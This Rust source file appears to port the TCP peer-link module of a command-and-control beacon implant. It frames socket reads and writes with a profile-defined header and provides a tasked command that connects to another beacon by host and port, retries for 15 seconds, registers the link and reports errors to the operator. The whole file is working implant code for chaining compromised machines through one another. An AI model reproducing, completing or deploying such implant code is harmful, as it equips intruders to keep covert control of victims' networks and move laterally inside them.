//! Port of src/link_tcp.cpp — TCP socket link channel.
//!
//! `lchannel_tcp` wraps a connected socket as an `LChannel` (blocking I/O),
//! framing data with the `tcp_frame_header` profile blob just like the SMB
//! channel. `command_tcp_connect` connects out to a beacon and registers the
//! socket as a forward TCP link, retrying for up to 15s.

use crate::beacon::SETTING_TCP_FRAME_HEADER;
use crate::callback::{post_error_d, Callback};
use crate::channel_tcp::channel_winsock_init;
use crate::commands::wsconnect;
use crate::link::{link_frame_header, link_register, LChannel};
use crate::parse::DataP;
use std::ffi::c_void;
use windows_sys::Win32::Networking::WinSock::{
    closesocket, ioctlsocket, recv, send, shutdown, WSAGetLastError, FIONBIO, INVALID_SOCKET, MSG_PEEK, SD_BOTH, SOCKET,
    SOCKET_ERROR, WSAEWOULDBLOCK,
};
use windows_sys::Win32::System::SystemInformation::GetTickCount;

/// Poll our socket and see if it's ready to be read from (is_ready).
fn is_ready(my_socket: isize, timeout: i32) -> bool {
    let until = unsafe { GetTickCount().wrapping_add(timeout as u32) };
    let mut result = false;

    unsafe {
        // Make our socket non-blocking, so we can peek at what's happening.
        let mut mode: u32 = 1;
        if ioctlsocket(my_socket as SOCKET, FIONBIO, &mut mode) == SOCKET_ERROR {
            return false;
        }

        // Peek data until our timeout.
        let mut buffer: u8 = 0;
        while GetTickCount() < until {
            let status = recv(my_socket as SOCKET, &mut buffer, 1, MSG_PEEK);

            // Socket was gracefully closed.
            if status == 0 {
                result = false;
                break;
            }
            // Data is available, yay.
            else if status > 0 {
                result = true;
                break;
            }
            // We would block, so try again [up to our timeout].
            else if WSAGetLastError() == WSAEWOULDBLOCK {
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
            // Some other socket error, bail.
            else {
                result = false;
                break;
            }
        }

        // Make our socket blocking again.
        mode = 0;
        if ioctlsocket(my_socket as SOCKET, FIONBIO, &mut mode) == SOCKET_ERROR {
            return false;
        }
    }

    result
}

/// Send a frame via a socket. Need TRUE/FALSE return value (send_frame).
fn send_frame(my_socket: isize, buffer: &[u8], length: usize) -> bool {
    if length == 0 {
        return true;
    }
    unsafe {
        if send(my_socket as SOCKET, buffer.as_ptr(), length as i32, 0) == SOCKET_ERROR {
            return false;
        }
    }
    true
}

/// Receive a frame from a socket. Need >0/0/<0 return value (recv_frame).
fn recv_frame(my_socket: isize, buffer: &mut [u8], size: usize) -> i32 {
    let mut total = 0usize;

    // Read in the result.
    unsafe {
        while total < size {
            let temp = recv(
                my_socket as SOCKET,
                buffer[total..].as_mut_ptr(),
                (size - total) as i32,
                0,
            );
            if temp == SOCKET_ERROR {
                return -1;
            } else if temp == 0 {
                break;
            }
            total += temp as usize;
        }
    }

    if total != size {
        return -1;
    }
    size as i32
}

/// Implement our TCP Beacon module (link_channel_tcp_read).
unsafe extern "C" fn link_channel_tcp_read(thisp: *mut c_void, buffer: *mut u8, max: usize) -> i32 {
    let inst = thisp as *const LChannel;
    let socket = (*inst).socket;

    // Read our length into a pro-forma frame.
    let mut flen = 0usize;
    let mut frame = link_frame_header(SETTING_TCP_FRAME_HEADER as i32, 0, &mut flen);
    if flen < 4 {
        return -1;
    }
    let rlen = recv_frame(socket, &mut frame, flen);
    if rlen == -1 || rlen as usize != flen {
        return -1;
    }

    // Extract our length value (raw host-order int).
    let get = i32::from_ne_bytes(frame[flen - 4..flen].try_into().unwrap());

    // Sanity check our get value.
    if get > max as i32 || get < 0 {
        return -1;
    }
    if get == 0 {
        return 0;
    }
    let out = std::slice::from_raw_parts_mut(buffer, get as usize);
    recv_frame(socket, out, get as usize)
}

/// Write a frame via the TCP channel (link_channel_tcp_write).
unsafe extern "C" fn link_channel_tcp_write(thisp: *mut c_void, buffer: *const u8, length: usize) -> i32 {
    let inst = thisp as *const LChannel;
    let socket = (*inst).socket;

    // Build and write our frame header.
    let mut flen = 0usize;
    let frame = link_frame_header(SETTING_TCP_FRAME_HEADER as i32, length as i32, &mut flen);
    if !send_frame(socket, &frame, flen) {
        return 0;
    }

    // Write the entire package.
    let payload = if length == 0 {
        &[]
    } else {
        std::slice::from_raw_parts(buffer, length)
    };
    if send_frame(socket, payload, length) {
        1
    } else {
        0
    }
}

/// Close the TCP channel (link_channel_tcp_close).
unsafe extern "C" fn link_channel_tcp_close(thisp: *mut c_void) {
    let inst = thisp as *const LChannel;
    let socket = (*inst).socket;
    shutdown(socket as SOCKET, SD_BOTH);
    closesocket(socket as SOCKET);
}

/// Poll the TCP channel for readability (link_channel_tcp_ready).
unsafe extern "C" fn link_channel_tcp_ready(thisp: *mut c_void, timeout: i32) -> i32 {
    let inst = thisp as *const LChannel;
    if is_ready((*inst).socket, timeout) {
        1
    } else {
        0
    }
}

/// Do nothing (link_channel_tcp_nop).
unsafe extern "C" fn link_channel_tcp_nop(_thisp: *mut c_void) {
    /* do nothing */
}

/// Initialize a SOCKET link channel (lchannel_tcp).
pub fn lchannel_tcp(socket: isize) -> LChannel {
    // Contract of our TCP channel: use blocking I/O.
    unsafe {
        let mode: u32 = 0;
        ioctlsocket(socket as SOCKET, FIONBIO, &mode as *const u32 as *mut u32);
    }

    // OK, setup the actual channel value.
    LChannel {
        pipe: 0,
        socket,
        read: Some(link_channel_tcp_read),
        write: Some(link_channel_tcp_write),
        close: Some(link_channel_tcp_close),
        flush: Some(link_channel_tcp_nop),
        ready: Some(link_channel_tcp_ready),
        wait: Some(link_channel_tcp_nop),
    }
}

/// Connect to a beacon over TCP and register the link (command_tcp_connect).
///
/// [port] - 2 bytes (network order)
/// [host] - ASCIIZ host name
pub fn command_tcp_connect(buffer: &[u8], length: usize, cb: Callback) {
    let mut data = buffer[..length.min(buffer.len())].to_vec();
    let mut parser = DataP::init(&mut data);
    let port = parser.data_short() as i32;
    let host = parser.data_buffer();

    // Init our winsock socket.
    channel_winsock_init();

    // Connect!
    let stopat = unsafe { GetTickCount().wrapping_add(15000) };
    let mut client: isize = -1;
    unsafe {
        while GetTickCount() < stopat {
            client = wsconnect(host, port);
            if client == INVALID_SOCKET as isize {
                std::thread::sleep(std::time::Duration::from_millis(1000));
            } else {
                break;
            }
        }
    }

    // If we failed above, please let the operator know.
    if client == INVALID_SOCKET as isize {
        post_error_d(0x44, unsafe { WSAGetLastError() });
        return;
    }

    // Initialize our client (IF we were successful).
    link_register(lchannel_tcp(client), crate::link::channel_forward_tcp(port), cb);
}
